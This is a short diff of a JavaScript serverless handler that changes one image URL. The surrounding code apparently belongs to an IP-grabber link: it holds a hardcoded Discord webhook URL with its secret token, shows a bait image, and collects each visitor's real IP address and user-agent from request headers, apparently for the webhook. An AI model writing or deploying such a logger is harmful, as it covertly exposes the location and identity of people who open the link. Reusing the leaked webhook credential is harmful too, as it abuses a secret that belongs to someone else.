@@ -6,7 +6,7 @@ module.exports = async function handler(req, res) {
 
   const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1531056764127154216/0E10iH35M9cZm2bY1CJ4R1KUnvGkwndndg3NWGv-AAFtdkTLCtxqFS60EHA02Ngrz1NK";
   const TARGET_IMAGE = "https://media.discordapp.net/attachments/1531048629631193141/1531068359012126900/Screenshot_2026-07-26-21-42-42-429_com.zhiliaoapp.musically-edit.jpg?ex=6a67de06&is=6a668c86&hm=002a17e5ac9293f8aaacbe2d6a46a41894baf89b50da14bd9eac58c8e17ac08e&=&format=webp&width=491&height=930";
-  const BOT_IMAGE = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExY3BwZ3c3ZnpxZXR0aTl5NzF1dTN3MXltMHFrNnl2aWh1dmI3anNzYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/IzigGVSs9fHjug20Mq/giphy.gif";
+  const BOT_IMAGE = "https://imgs.search.brave.com/wLpV3f-sbqszBDTQnQk-MY4Kq0seA1P3wVVeK1XijMQ/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9tZWRp/YS50ZW5vci5jb20v/emlOU0REVEN5aXdB/QUFBTS9kaXNjb3Jk/LXRyb2xsaW5nLmdp/Zg.gif";
 
   const ip = req.headers["cf-connecting-ip"] || req.headers["x-vercel-forwarded-for"]?.split(",")[0] || req.headers["x-forwarded-for"]?.split(",")[0] || req.headers["x-real-ip"] || req.socket?.remoteAddress || "Unknown";
   const ua = req.headers["user-agent"] || "Unknown";
